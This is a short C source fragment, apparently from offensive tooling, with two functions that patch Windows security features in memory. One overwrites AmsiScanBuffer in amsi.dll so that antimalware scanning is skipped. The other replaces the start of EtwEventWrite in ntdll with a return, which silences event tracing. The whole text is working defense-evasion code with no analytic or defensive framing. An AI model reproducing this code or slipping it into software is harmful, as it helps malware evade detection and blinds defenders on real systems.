// ========== AMSI Patch (内存写入) ==========
void patch_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void *pAddr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pAddr) return;

    // x64: mov eax, 0x57 00 07 80; ret  → 返回 AMSI_RESULT_CLEAN
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
        0xC3                            // ret
    };
    DWORD old;
    VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), old, &old);
}

// ========== ETW Patch (EtwEventWrite → ret) ==========
void patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    void *pAddr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!pAddr) return;
    unsigned char ret = 0xC3;
    DWORD old;
    VirtualProtect(pAddr, 1, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pAddr, &ret, 1);
    VirtualProtect(pAddr, 1, old, &old);
}

